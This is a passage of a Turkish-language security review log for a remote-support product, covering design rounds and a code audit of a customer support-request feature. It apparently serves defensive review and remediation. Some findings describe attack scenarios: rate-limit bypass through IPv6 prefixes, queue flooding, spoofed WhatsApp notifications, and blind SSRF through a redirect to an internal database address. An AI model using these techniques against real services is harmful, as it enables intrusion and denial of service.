- WhatsApp biçim karakterleri (`* _ ~ \``) kaçışlanır.
- Gerçek panel bağlantısı sabit bir etiketle ilk satıra konur.
- Panelde açıklama otomatik bağlantıya çevrilmez.
  Atanan: backend, frontend

#### G-E9-6 [ORTA] whatsapp-bildirim servisi kimliksiz ve internete açık; kişisel veri düz HTTP ile ve yurt dışına gidiyor; K13 yalnız TLS'i kapsıyor (A02/A05, KVKK)

Yer: T33/T34, K13, §8 (`WHATSAPP_SERVICE_URL` vars. `http://89.252.189.211:3000`)
Sorun:

1. Servis kimlik doğrulaması istemiyor ve herkese açık. Herkes aynı numaradan teknisyenlere sahte "Yeni destek talebi + bağlantı" mesajı gönderebilir; gönderici numarasına duyulan güven boşa çıkar.
2. Mesajdaki ad, telefon ve açıklama Meta altyapısına, yani yurt dışına aktarılıyor (KVKK md. 9). Bu aktarım aydınlatma metninde yok.
3. Teknisyen telefonlarındaki kopyalar saklama ve anonimleştirme işinin (AC-159) dışında kalıyor.
4. Prod'da `http://` kullanımı yalnız bir uyarı logu üretiyor.
   Öneri:

- K13 prod ön koşulu genişletilir: servis API anahtarı, güvenlik duvarında yalnız Remote sunucusuna izin, TLS ya da özel ağ. Prod'da `http://` ve özel olmayan adres verilirse kanal kapalı başlar (fail-closed).
- Varsayılan mesaj kişisel veri içermez: "[Firma] Yeni destek talebi — panelde görüntüleyin". Kişisel veri içeren şablon tenant seçeneği olur ve aydınlatma seed metnine WhatsApp/yurt dışı aktarım maddesi eklenir. Bu, AC-150 metninde değişiklik gerektirir.
- Gövde strict tutulur; `attachments` alanı hiç gönderilmez.
  Atanan: mimar, devops, proje-yoneticisi (AC-150), kullanıcı (K13)

#### G-E9-7 [ORTA] IPv6 /56 önek kovası atlatılabiliyor; tenant kovası, 50 bekleyen sınırı ve WhatsApp çoğaltmasıyla tenant kalıcı olarak kapatılabiliyor, paylaşılan WhatsApp numarası engellenebiliyor (A04)

Yer: §5.4, K15, AC-143/144; `lib/ip.ts:26-33` (`prefixKey` IPv6 → /56, `ipKey` → /64)
Sorun:

- Ücretsiz bir /48 (ör. tünel sağlayıcısı) 256 adet /56 ve 65.536 adet /64 öneki verir. Bu, saatte 20 talep sınırını 256 katına çıkarır. Örnek başına 3 bekleyen sınırı ise /64 başına uygulandığı için pratikte işlevsiz kalır.
- 50 bekleyen talep, açık tutulan 50 `/ws/request` soketiyle 30–120 dk dolu kalır (QUEUE_FULL). Tenant kovası her 15 dk'da yeniden tetiklenebilir.
- Her talep 5 alıcıya gider: tenant başına saatte 300 WhatsApp mesajı. Bu, tüm Nokta projelerinin kullandığı numaranın spam nedeniyle engellenmesi riskini doğurur (R13).
- Ters yönde: kurumsal NAT arkasındaki bir ofis (US-29'un asıl kullanıcısı) IPv4 /32 başına saatte 5 talep ve 3 bekleyen sınırına kendi kendine takılır.
  Öneri:
- IPv6 için ek /48 kovası eklenir.
- Tenant kovası aşıldığında bütün tenant kilitlenmez: yalnız son N günde bu tenant'ta görülmemiş kaynaklar reddedilir. Tenant Admin'e panel uyarısı ve tenant etiketli alarm gider.
- WhatsApp'a alıcı başına saatte 10 mesaj sınırı konur; fazlası "son 1 saatte N yeni talep" özeti olarak birleştirilir. Global WhatsApp hız sınırı da eklenir.
- NAT ölçüsü proje-yoneticisi ile gözden geçirilir.
  Atanan: mimar, backend, proje-yoneticisi

#### G-E9-8 [DÜŞÜK] nginx erişim logu firma dosyası yolunu maskelemiyor (A09, G-10)

Yer: `deploy/nginx/remote.noktabilisim.net.conf:13-16` (yalnız `/downloads/Destek-`); mimari-e9 §8 yalnız Caddy filtresinden söz ediyor
Öneri: `remote_log_uri` map zincirine `/downloads/NoktaDestek-[^/]+` → `/downloads/NoktaDestek-***` eklenir; runbook §8.3 güncellenir. Atanan: devops

#### G-E9-9 [DÜŞÜK] Tasarımın "mevcut" dediği iki kontrol kodda yok

Yer: T31 "pino redaksiyon `*.requestSecret` (mevcut)": `lib/logger.ts:10-25` yalnız `*.secret` içeriyor; pino yolları tam anahtar adıyla eşleşir. T30 "IP başına eşzamanlı WS sınırı (mevcut 20)": `signaling/ws.ts:63-64` yalnız dakikada 31 upgrade sayıyor.
Öneri: `REDACT_PATHS`'e `*.requestSecret` ve `*.wsTicket` eklenir. Eşzamanlı WS sınırı ya eklenir ya da T30 metni düzeltilir (soket sayısını bekleyen sınırları zaten bağlıyor). Atanan: backend, mimar

#### G-E9-10 [DÜŞÜK] POST `/public/requests` adım sırası tutarsız; FOR UPDATE ilk okuma olmalı

Yer: mimari-api POST `/public/requests` ("hız (ip/önek/tenant) → zod → ref")
Sorun: Tenant kovası tenantId'yi gerektiriyor ama sırada ref çözümlemesinden önce geliyor. Ayrıca TX içinde FOR UPDATE'ten önce kilitsiz bir okuma yapılırsa InnoDB anlık görüntüsü erken oluşur ve bekleyen sayımı yarışla aşılabilir.
Öneri: Sıra şöyle olmalı: Origin → ip/önek → zod → ref (geçersizse `ref_invalid`) → tenant kovası → TX. TX'in ilk ifadesi `FOR UPDATE` olur. AC-143 "60 paralel → 50" testi bu sırayı korur. Atanan: backend

#### G-E9-11 [DÜŞÜK] Statik `/downloads/NoktaDestek-<label>-<ref>.exe` yolu label ve ref'i doğrulamıyor; firma penceresinde alan adı/sürüm satırı yok (A04)

Yer: ADR-0006 r4, §8 `@agentExe`, AC-133
Sorun: Resmi alan adında keyfi adlı bir dosya bağlantısı üretilebiliyor (ör. `NoktaDestek-Fatura2026-…`). İkili gerçek ve zararsız, ama bağlantı sosyal mühendislik için kullanılabilir.
Öneri: `forward_auth` ref ve label eşleşmesini iç uçta doğrular, ya da bu durum kabul edilen risk olarak runbook'a yazılır. Firma penceresi dosya adındaki label'ı değil, yalnız sunucudan gelen firma adını gösterir. P6 karşılamasıyla eşit olacak şekilde alan adı + sürüm satırı eklenir. Atanan: devops, istemci

#### G-E9-12 [DÜŞÜK] Ret mesajı URL ve telefon taşıyabiliyor (T38)

Öneri: `rejectMessageSchema` `://`, `www.` ve alan adı kalıplarını reddeder. UI'da hazır seçenekler varsayılan olur. Win32 statik metin `SS_NOPREFIX` ile çizilir (`&` önek sayılmasın). Atanan: backend, istemci

#### G-E9-13 [DÜŞÜK] Hatırlama: varsayılan işaretli kutucuk ve paylaşılan Windows hesabında başkasının bilgileriyle dolu gelen form (T36, V15)

Öneri: Form dolu açıldığında "Bu bilgiler size ait değilse: Bilgilerimi unut" ipucu gösterilir. Varsayılan işaretli kutucuğun KVKK açısından uygunluğu kullanıcı onayıyla kayda geçer. Önceki çalışmadan kalan `hatirla.bin.tmp` O_EXCL'i bozmasın diye dosya silinip bir kez yeniden denenir. Atanan: istemci, kullanıcı

#### G-E9-14 [DÜŞÜK] `/ws/panel` çıkış ve yetki kaldırmadan sonra 60 sn'ye kadar kişisel veri içeren bildirim almaya devam ediyor (T35)

Öneri: Logout, logout-all ve yetki toggle servisleri `hub.closeByUser/AuthToken` fonksiyonunu doğrudan çağırır (S-P3-8 kalıbı); 60 sn döngüsü yalnız yedek yol olarak kalır. Atanan: backend

### İstenen kontrollerin sonucu (bulgu yok)

- **Ref başka sunucuya yönlendirebilir mi:** Hayır. Sunucu URL'si yalnız ldflags ile gömülüyor (`internal/config/config.go:2`). Ref `[a-z2-7]{16}` biçiminde ve yalnız sorgu değeri olarak kullanılıyor. TLS doğrulaması mevcut.
- **Ticket ve sır:** Ticket yalnız sır sahibinin soketine itiliyor; tüketim tek kullanımlık (`store.ts` `take`). `/ws/guest` UPDATE'inde `AND request_id` koşulu var. Talep oturumunda `active_code` NULL; `token_hash` hiç döndürülmüyor; indirme yolunda `!row.activeCode` → 404 (`public/agent.ts`). Kod ve link yoluyla talep oturumuna katılınamıyor.
- **T28:** 80 bit ref ve ipKey başına 10/dk sınırıyla numaralandırma pratik değil. Tek 404 yolu yeterli. Önbellek geçersiz kılma, tenant pasife alındığında da çalışmalı (P9).
- **T33 SSRF:** URL yalnız env'den; alıcı E.164; şablon sunucuda. Ek bulgu yok (bkz. G-E9-6).
- **XSS/CSV:** React metin, Sonner düz metin, Cc/Cf/bidi reddi. CSV'de S8-1 düzeltmesi var (`lib/csv.ts:12`); telefon ve açıklama CSV'ye girmiyor.
- **P7 kapıları:** Protokol §5.2 adım 5'e göre değişmiyor. Kontrol izni ve kapı istemcide (ADR-0009). Caps konusu için bkz. G-E9-2.
- **Super Admin / tenant:** Firma seçimi zorunlu, `historyScope` istisnası yok, hub anahtarı soket bağlamından geliyor.
- **Audit kapsamı:** AC-160 olaylarının tamamı listede. Mask regex'i `keyType`'ı maskeler; tasarım bunu izinli listeye ekliyor, doğru. Tek not: `guest.admitted{via:"request"}` actor'ı `customer`/SYSTEM olmalı ve `acceptedBy` taşımalı.

### Otomatik tarama

Tasarım turu, yeni kod yok. Yeni ve değişen belgelerde gizli bilgi kalıbı (`git grep` regex'i) eşleşme vermedi. İzlenmeyen `.env` yok.

### Olumlu

- Talep sırrı 256 bit, hash'le saklanıyor, subprotocol'de taşınıyor; Caddy log filtresi `Sec-Websocket-Protocol`'ü siliyor.
- Kabul TX'i koşullu UPDATE ile tasarlanmış; yarış ve açık oturum sınırı testleri tanımlı.
- Tenant'a özel dosya aynı ikili; hash eşitliği CI testine bağlı (ADR-0010 korunuyor).
- DPAPI CurrentUser + LocalAppData; sır, açıklama ve ref dosyaya yazılmıyor.
- `/ws/panel` tek yönlü; kabul ve ret CSRF'li REST üzerinden.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")

G-E9-8..14 (Düşük). G-E9-2..7 (Orta) P8b-1/P8b-2 içinde ele alınmalı veya gerekçesiyle "Sonra"ya yazılmalı. G-E9-1 (Yüksek) P8b-1 kodlamasından önce mimar revizyonuyla kapatılmalı.

DURUM: DÜZELTİLMELİ (Kritik 0 / Yüksek 1 / Orta 6 / Düşük 7)

---

## Tasarım turu 2 — E9 (P8b) — r2 doğrulaması (2026-11-12)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 1 / Düşük 2 (yeni: G-E9-15..17). Tur 1'deki 14 bulgunun 14'ü KAPANDI.

Kapsam: `docs/mimari-e9.md` §13 (r2, bağlayıcı), ADR-0016 "Revizyon r2", `docs/mimari-api.md` "Destek talepleri (P8b)" (r2 satırları), `docs/mimari-protokol.md` §5, `docs/gereksinimler-kabul-kriterleri-e9.md` AC-146/150/154. Kodda henüz P8b yok. G-E9-14 için P9 çağıranlarının kodda olmadığı doğrulandı (`apps/server/src` içinde `switch-tenant` veya yetki PATCH ucu yok).

### Tur 1 bulgularının durumu

| ID          | Durum             | Dayanak / not                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| ----------- | ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| G-E9-1 [Y]  | KAPANDI           | §13.1: 6 haneli `requestCode` istemcide, panelde ve onay ekranında görünür. Kalıcı ipucu "firmanın kayıtlı numarasından arayın" AC-146'da. `knownSource` rozeti ve "İlk kez görülen kaynak" uyarısı var. S12 Sonra listesinin başına alındı. Kodun WhatsApp'a da yazılması tur 1 önerisinden sapma, ama zararsız: saldırgan kendi talebinin kodunu zaten görüyor, başka talebin kodu ona bir şey kazandırmıyor. Kalan risk usule bağlı: teknisyenin gerçekten kayıtlı numarayı araması. Kılavuzda ve eğitimde vurgulanmalı. "Bilinen ağ" sinyalinin zayıflığı için bkz. G-E9-15. |
| G-E9-2 [O]  | KAPANDI           | §13.2 ve protokol §5.2 adım 2/4: caps DB'deki etkin yetkiden hesaplanır, `TechConn` aranmaz. Pasif kullanıcı veya tenant → `auth_revoked`. Teknisyen yokken admit anında 120 sn zamanlayıcı başlar. `caps=[]` regresyon testi tanımlı.                                                                                                                                                                                                                                                                                                                                           |
| G-E9-3 [O]  | KAPANDI           | §13.3 ve AC-154: onay her kabulde istenir, odak Vazgeç'te, butonlar 1,5 sn sonra etkinleşir, geri sayım yok. Yerel `CANCELLING` durumunda gelen kabul yok sayılır. ACCEPTED→CANCELLED tek decline yoluna bağlandı (WS, REST cancel ve close 1000). Onay kaydı bağlantı IP/UA'sı ve `request_id` ile yazılır.                                                                                                                                                                                                                                                                     |
| G-E9-4 [O]  | KAPANDI           | §13.4: `MIN_AGENT_VERSION` → 426 `CLIENT_OUTDATED`. Kontrol talep, resolve, join ve `/ws/guest` yollarında; sürüm ticket'a taşınır. İstemci sabit biçimli URL'yi açar. Runbook adımı var.                                                                                                                                                                                                                                                                                                                                                                                        |
| G-E9-5 [O]  | KAPANDI           | §13.5: şablonda müşteri metni yok, firma adı temizleniyor, açıklama tek satır, panelde linkify yok.                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| G-E9-6 [O]  | KAPANDI (tasarım) | Mesajda kişisel veri yok, `attachments` gönderilmiyor (strictObject), prod'da `http://` + açık adres → fail-closed. K13 prod ön koşulu (TLS veya özel ağ, güvenlik duvarında yalnız Remote) **usule bağlı**: P13 prod kontrol listesinde doğrulanmalı. Servis API anahtarı Sonra'da.                                                                                                                                                                                                                                                                                             |
| G-E9-7 [O]  | KAPANDI           | §13.6: /48 kovası; `net_key` başına 10 bekleyen; ≥ 40'ta yalnız bilinen kaynak kabul edilir; tenant kilitlenmez; güvenilen CIDR ile NAT ofisi muaf tutulur. Yeni doğan risk G-E9-15/16'da.                                                                                                                                                                                                                                                                                                                                                                                       |
| G-E9-8 [D]  | KAPANDI           | §13.7, nginx map + runbook §8.3 (devops P8b-1).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| G-E9-9 [D]  | KAPANDI           | `REDACT_PATHS` += `requestSecret`, `wsTicket`, `deviceKey`. ipKey başına ≤ 5 `/ws/request`. T30 düzeltildi.                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| G-E9-10 [D] | KAPANDI           | mimari-api sırası doğru: ref tenant kovasından önce, TX'in ilk ifadesi `FOR UPDATE`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| G-E9-11 [D] | KAPANDI           | `agent-ready` label+ref doğruluyor. Pencere label'ı göstermiyor; sunucu/sürüm/SHA satırı var.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| G-E9-12 [D] | KAPANDI           | `rejectMessageSchema` URL, e-posta ve telefon kalıplarını reddediyor. Hazır seçenekler varsayılan. `SS_NOPREFIX` var.                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| G-E9-13 [D] | KAPANDI           | Kutucuk varsayılan işaretsiz, "Bilgilerimi unut" ipucu var, tmp yeniden deneme var.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| G-E9-14 [D] | KAPANDI           | `closeByUser`/`closeByAuthToken` var. Logout, logout-all ve şifre değişimi P8b-1'de bağlanıyor. P9 çağıranları P9 giriş şartı (bu uçlar kodda henüz yok).                                                                                                                                                                                                                                                                                                                                                                                                                        |
| Audit notu  | KAPANDI           | `guest.admitted` actor `customer`, `{requestId, acceptedBy}`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |

### Yeni bulgular

#### G-E9-15 [ORTA] "Bilinen ağ" sinyali /24 ve /48 ile çok kaba; uyarıyı susturuyor ve hız ayrıcalığı veriyor (A04/A07)

Yer: mimari-e9 §13.1 (`network` sinyali: `netKey()` IPv4 /24, IPv6 /48, son 90 gün); §13.6 ("≥ 40 iken yalnız bilinen", "bilinen kaynak tavanı 120/sa"); mimari-api POST `/public/requests` sırası.
Sorun: Mobil operatörlerin CGNAT'ı ve ev ISS'lerinin havuzları IPv4 /24'ü binlerce aboneyle paylaşır. ISS'ler müşteriye genelde /56 verdiği için IPv6 /48 de ~256 aboneyi kapsar. Tenant'ın tek bir müşterisi 90 gün içinde bu havuzdan oturum yaptıysa, aynı havuzdaki herkes "bilinen ağ" sayılır. Bunun iki etkisi var:
(1) "İlk kez görülen kaynak" uyarı rozeti kalkar ve yerine güven veren "Bu ağdan daha önce oturum yapıldı" yazısı gelir. Bu, G-E9-1 önleminin teknisyen üzerindeki etkisini zayıflatır.
(2) G-E9-7 için konan "yeni kaynak eşiği" (≥ 40) ve tenant kovası muafiyeti (120/sa) böyle bir havuzdaki saldırgana da açılır.
İstismar senaryosu: Saldırgan, tenant müşterilerinin yaygın kullandığı bir mobil operatörden bağlanır ve IP yenileyerek bilinen bir /24'e düşer. Talebi "bilinen ağ" rozetiyle gelir; teknisyen kodu sormadan kabul etmeye daha yatkın olur. Saldırgan birkaç bilinen önekten kuyruğu 50'ye doldurup gerçek yeni müşterileri `QUEUE_FULL` ile dışarıda bırakır.
Düzeltme (mimar → backend/frontend, P8b-1):

- Panelde güven veren `network` rozeti yalnız şu iki durumda gösterilir: güvenilen CIDR eşleşmesi, ya da **tam ipKey** (IPv4 /32, IPv6 /64) eşleşmesi. /24 ve /48 eşleşmesi gösterilecekse nötr metinle gösterilir ("Benzer ağdan önceki oturum var"), "İlk kez görülen kaynak" uyarısını kaldırmaz.
- Hız ve kuyruk ayrıcalıkları (≥ 40 eşiği, 120/sa) yalnız güvenilen CIDR'ye ve `known_device`'a verilir; `net_key` eşleşmesi tek başına yetmez.
- Kılavuzda şu açıkça yazılır: "Rozet ne olursa olsun kayıtlı numaradan arayıp kodu sorun."
- AC-143 ve AC-146 metinleri buna göre güncellenir.

#### G-E9-16 [DÜŞÜK] Güvenilen CIDR muafiyeti eşzamanlı `/ws/request` sınırını (ipKey ≤ 5) kapsamıyor

Yer: mimari-e9 §13.6 (muaf listesi) ile §13.7 G-E9-9 / protokol §5 "ipKey başına eşzamanlı ≤ 5"
Sorun: Güvenilen CIDR'deki NAT ofisi bekleyen sınırından muaf, ama bekleyen 6. talebin soketi upgrade'de 429 alır. Talep oluşur, istemci ise kuyruğa bağlanamaz ve 120 sn sonra DISCONNECTED olur. Bu bir istismar değil; G-E9-7'nin NAT ofisi hedefini sessizce bozuyor.
Düzeltme: Güvenilen CIDR kaynakları eşzamanlı soket sınırından da muaf tutulur (tenant 50 tavanı sınırlamayı zaten yapıyor), ya da sınır ipKey başına bekleyen sınırıyla hizalanır. Atanan: mimar, backend.

#### G-E9-17 [DÜŞÜK] `known_device` bir kez kazanılınca kalıcı; geri alma yolu yok

Yer: mimari-e9 §13.1 `device` sinyali
Sorun: Saldırganın kendi makinesi tek bir kabul edilmiş oturumdan sonra (sosyal mühendislik ya da işten ayrılmış bir çalışan) süresiz olarak "Bu bilgisayar daha önce destek aldı" rozeti ve G-E9-15 düzeltmesiyle hız ayrıcalığı alır.
Düzeltme: Sinyal de 90 günlük pencereyle sınırlanır. Panelde talep veya oturum detayından "Bu cihazı güvenilir sayma" (device_hash kara listesi, audit'li) eklenir, ya da bu iş Sonra listesine yazılır. Atanan: mimar, backend.

### Otomatik tarama

Tasarım turu, yeni kod yok. Tur 1'den sonra değişen belgelerde gizli bilgi kalıbı yok.

### Olumlu

- r2 bütün maddeleri P8b-1 ve P8b-2'ye bağladı; "Sonra"ya kaçırılan Orta veya Yüksek madde yok.
- Onay akışı P7 diyalog kurallarıyla aynı. İptal ve kabul yarışı tek sonuca (CANCELLED) indirgendi.
- WhatsApp kanalında kişisel veri yok ve kanal fail-closed. Gönderim sınırları alıcı, tenant ve sistem genelinde üç katmanlı.
- Değişiklikler ADR, API, protokol ve AC belgelerinin hepsine tutarlı biçimde işlendi.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")

G-E9-15 P8b-1 kodlamasıyla birlikte ele alınmalı (yalnız rozet ve muafiyet kuralı değişiyor, şema aynı kalıyor). G-E9-16 ve G-E9-17 P8b-1 içinde ya da "Sonra" olarak eklenebilir. K13 doğrulaması P13 prod kontrol listesine yazılmalı.

DURUM: GEÇTİ (Kritik 0 / Yüksek 0 / Orta 1 / Düşük 2) — P8b-1 kodlamasına geçilebilir.

---

## P8b-1 — Tur 1 — Müşteri destek talebi (E9) kod denetimi (2026-11-12)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 4 (S8b-1..4)

Kapsam: `apps/server/src/requests/*`, `notify/whatsapp.ts`, `lib/version.ts`, `lib/ip.ts`, `signaling/{rooms,admit,ws,handlers}.ts` (ön-kabullü /ws/guest),
`sessions/history.ts` (talep bloğu ve CSV), `packages/contracts/src/{api/requests.ts,ws-request.ts}`, `deploy/Caddyfile`, `deploy/nginx/*`.

### Bulgular

#### S8b-1 [DÜŞÜK] WhatsApp istemcisi yönlendirmeleri izliyor (A10 SSRF, fail-closed delinmesi)

Yer: `apps/server/src/notify/whatsapp.ts:243`
Sorun: `fetch` çağrısında `redirect` belirtilmemiş; varsayılan `follow`. Servis kimliksiz ve düz HTTP. Ele geçirilmiş servis ya da yoldaki bir MITM 307/308 döndürürse aynı POST gövdesi (alıcı numarası, şablon) yönlendirilen adrese tekrar gönderilir. Bu adres iç ağ (`server`/`mysql` docker ağı, metadata) veya `https`'ten `http`'ye düşen bir adres olabilir. URL env'den geldiği için tenant bu adresi değiştiremez (T33 sağlam). Fakat §13.5'teki fail-closed kuralı yalnız ilk URL'yi denetliyor.
Senaryo: Staging'deki varsayılan `http://89.252.189.211:3000` yolunda bir saldırgan `307 Location: http://mysql:3306/` ya da başka bir iç adres döndürür. Sunucu, iç ağa saldırgan seçimi bir hedefe istek atan bir aracıya dönüşür (kör SSRF).
Öneri: `fetch(..., { redirect: "error" })` (veya `"manual"` ve 3xx'i hata say). Birim testi: 307 → `fail`, ikinci istek atılmıyor.
Atanan: backend-dev

#### S8b-2 [DÜŞÜK] Ön-kabullü misafirde eşzamanlı iki /ws/guest bağlantısı ortak `guest.peer`'ı eziyor (A04, kendi oturumunu bozma)

Yer: `apps/server/src/signaling/ws.ts:145-148`, `apps/server/src/signaling/admit.ts:107-125`
Sorun: `room.admitting = true` ancak `await rooms.db.user.findUnique(...)` sonrasında set ediliyor (admit.ts:107 kontrolü ile 124 ataması arasında await var). Ayrıca her bağlantı `g.peer = peer` ile aynı misafir nesnesini eziyor. Sıra şöyle: A ticket'ı (gen1) ile bağlanır → /ws/request yeniden bağlanır, gen2 verilir → B, gen2 ile bağlanır. İkisi de admit'e girer. A TX'i kazanır, B kaybeder. Kaybedenin `endGuest` adımı `guest.peer`'ı, yani B'yi kapatır. Sonrasında `room.admitted = guest` ölü peer'a işaret eder, A'nın soketi ise yetim kalır. Tenant sınırı veya yetki aşılmıyor. Bunu yalnız talep sırrının sahibi (müşterinin kendisi) tetikleyebilir. Sonuç: oturum bağlanmış görünür ama medya/kontrol akmaz, teknisyen-yok/aktif zamanlayıcıları belirsiz duruma girer.
Öneri: `admitting` bayrağını ilk `await`'ten önce set edin (veya ön-kabullü misafirde tek uçuşlu kilit kullanın). `g.peer` yalnız admit kazanılınca atansın. Kaybeden bağlantı yalnız kendi peer'ını kapatsın (`endGuest`'e peer parametresi geçin).
Atanan: backend-dev

#### S8b-3 [DÜŞÜK] `request.created` audit'i müşteri IP'sini JSON'a ikinci kez yazıyor; talep anonimleştirmesi audit'i kapsamıyor (A09/KVKK)

Yer: `apps/server/src/requests/service.ts:243`
Sorun: `newValue: { ip: ctx.ip, ... }`. IP zaten audit'in `ip_address` sütununda var. Talep anonimleştirmesi (AC-159, `repo.ts:264-271`) `support_requests.ip/ip_key/net_key` alanlarını boşaltıyor. Audit ise 730 gün tutuluyor, dolayısıyla IP orada kalıyor. Bu tek başına bir ihlal değil (audit IP'si ortak standart), ama alan gereksiz yere çiftleniyor.
Öneri: `newValue`'dan `ip` çıkarılsın; `clientVersion` kalsın.
Atanan: backend-dev

### Doğrulanan kontroller (bulgu yok)

- **Public uçlar:** girdi şemaları `strictObject` ve hepsinde uzunluk sınırı var. Ad/açıklama için Cc/Cf (bidi, sıfır genişlik) yasak, açıklama tek satıra indiriliyor, telefon E.164'e normalize ediliyor. bodyLimit 8 KB / 1 KB. AGENT kuralı `checkPublicClient` ile POST/cancel'da ve `/ws/request` upgrade'inde uygulanıyor.
- **Ref oracle:** biçim dışı, yok, yenilenmiş, pasif tenant ve ayarı olmayan tenant durumlarının hepsi tek `REQUEST_REF_INVALID` yanıtına düşüyor (`service.ts:60,96-100`). Geçersiz ref, ipKey başına 10/dk sayılıyor, ardından 15 dk kilit; ortak kova `/ws/request`'te geçersiz sırrı da sayıyor. Tek zamanlama farkı biçim kontrolünde (DB sorgusu yok); bu da bir bilgi sızdırmıyor. Firma dosyası forward_auth yolu ref + label'ı doğruluyor ve tek 404 dönüyor.
- **XFF (ADR-0015):** nginx XFF'i `$remote_addr` ile yeniden yazıyor. Caddy 4451 yalnız 172.30.0.128'e güveniyor (strict) ve yalnız loopback'e yayımlanıyor. 4450 dinleyicisinde güvenilen proxy yok. server `trustProxy = TRUSTED_PROXY_CIDR` (prod'da zorunlu). WS `clientIp` aynı kuralı izliyor.
- **Talep sırrı ve ticket:** 256 bit; DB'de yalnız SHA-256 tutuluyor; sır yalnız 201 yanıtında ve subprotocol'de taşınıyor, `url.search` doluysa 403. Ticket tek kullanımlık (`take`) ve `requestId`'ye bağlı misafire ait; kuşak (`ticketGen`) yeniden bağlanmada eskisini geçersiz kılıyor. Ticket yalnız sır sahibinin soketine gidiyor; başka talebin sırrı başka satıra çözülüyor. Cancel her durumda 204 dönüyor (oracle yok).
- **Kabul yarışı:** teknisyen `FOR UPDATE` → açık oturum sınırı → `updateMany(id, tenantId, PENDING, expiresAt>now)` tek koşullu; kaybeden `lostRace` sınıflandırmasına düşüyor. İptal ve decline tek TX'te ve koşullu. Oluşturma TX'inin ilk ifadesi ayar satırı kilidi (G-E9-10).
- **Tenant/yetki:** her panel ucunda `requireAuth` (CSRF double-submit + Origin) → `requirePerm` → `tenantScope` (firma seçmemiş Super Admin 403). Sorgular `tenantId` filtreli; başka tenant'ın id'si 404 alıyor. Kabul yalnız kendi tenant'ında (Super Admin kabul edemiyor). `/ws/panel` için Origin allowlist, çerez, `support_requests.view` ve acting tenant şartı var; hub anahtarı soket bağlamından geliyor; 60 sn'de bir yeniden doğrulama yapılıyor; istemciden gelen mesaj 1008 ile kapanıyor.
- **Caps / P7:** caps admit anında DB'deki etkin yetkiden hesaplanıyor (`admit.ts:121,151`). Pasif teknisyen/tenant → `auth_revoked`. Talep oturumunda lobi/admit mesajı reddediliyor. P7 kapıları değişmedi.
- **XSS/CSV:** panel bileşenlerinde `dangerouslySetInnerHTML`/linkify yok. Tek `href`'ler sabit iç rotalar. CSV formül kaçışı (S8-1 kalıbı) ad ve not hücrelerine uygulanıyor. Ret mesajı URL/e-posta/telefon süzgecinden geçiyor ve WS'de düz metin.
- **WhatsApp:** URL yalnız env'den geliyor. Şablon firma adı + 6 haneli kod + sabit panel bağlantısından oluşuyor (müşteri verisi yok). `attachments` gönderilmiyor. Prod'da http + genel adres → kanal kapalı, test 502. Sınırlar tenant 30, alıcı 10, global 300/sa. Audit'te numara maskeli (S8b-1 hariç).
- **Log maskeleri:** pino `*.requestSecret`, `*.wsTicket`, `*.deviceKey`, `*.ref`, `sec-websocket-protocol` redakte ediliyor; URL sorgu dizesi yazılmıyor. Caddy (erişim + varsayılan logger) ve nginx `NoktaDestek-***` maskesini uyguluyor, subprotocol/çerez siliniyor. Audit `MASKED_KEY` `code|ticket|key` kalıplarını kapsıyor.
- **MIN_AGENT_VERSION:** oluşturma, `/ws/request` ve `/ws/guest` (ticket'taki sürüm) yollarında 426 dönüyor.

#### S8b-4 [DÜŞÜK] Yeni test dosyası CI gitleaks'ini kıracak (süreç)

Yer: `apps/server/test/integration/requests-p8b-4.test.ts:147,176`
Sorun: `deviceKey` (iki sabit, alıntı gitleaks nedeniyle redakte edildi) test sabitleri `generic-api-key` kuralına takılıyor (`dir` taraması 2 eşleşme). Gerçek sır değil, ama dosya commit edilince CI gitleaks adımı kırmızıya düşer.
Öneri: Sabitleri kuralın yakalamayacağı bir biçimde üretin (ör. `"d".repeat(22)` ya da yardımcı bir `fakeDeviceKey()`) veya `.gitleaks.toml`'a yalnız bu yol ve satır için dar bir allowlist ekleyin.
Atanan: backend-dev

### Otomatik tarama çıktıları

- `pnpm audit --audit-level high`: **No known vulnerabilities found**.
- gitleaks v8.30.1 `git` modu (18 commit): **no leaks found**.
- gitleaks `dir` modu (çalışma ağacı): 15 eşleşme. Bunların 13'ü `apps/web/.next/**` derleme çıktısı (preview/prerender anahtarları; repoda yok, `.gitignore`'da) ve gürültü olarak yok sayıldı. Kalan 2 eşleşme S8b-4.
- `.env` geçmişi: git geçmişinde yalnız `.env.example` var.
- Grants: `support_requests` ve `tenant_request_settings` için `app` kullanıcısına SELECT/INSERT/UPDATE veriliyor; DELETE/ALTER/DROP/INDEX/TRIGGER/REFERENCES REVOKE ediliyor. Anonimleştirme UPDATE ile yapıldığı için en az yetkiyle tutarlı.

### Tasarımda vaat edilip kodda bulunmayanlar

Yok. G-E9-1..17 kararlarının kod karşılıkları doğrulandı: kod/rozet, caps DB'den, onay tazeliği (istemci), MIN_AGENT_VERSION, kişisel verisiz şablon, /48 + `net_key` bekleyen sınırı, nginx/Caddy maskeleri, REDACT_PATHS, TX sırası, label+ref doğrulaması, ret süzgeci, `closeByUser`/`closeByAuthToken`, known_device ayrıcalığı, güvenilen CIDR'in soket sınırından muafiyeti.

### Olumlu

Kodda tek 404 yolu, tek kullanımlık ve kuşaklı ticket, koşullu UPDATE durum makinesi, commit sonrası bellek yan etkileri, sabit kalıplı strict şemalar ve log ile audit maskesinin birlikte uygulanması dikkat çekiyor. Tenant izolasyonu her sorguda arka uçta sağlanıyor.

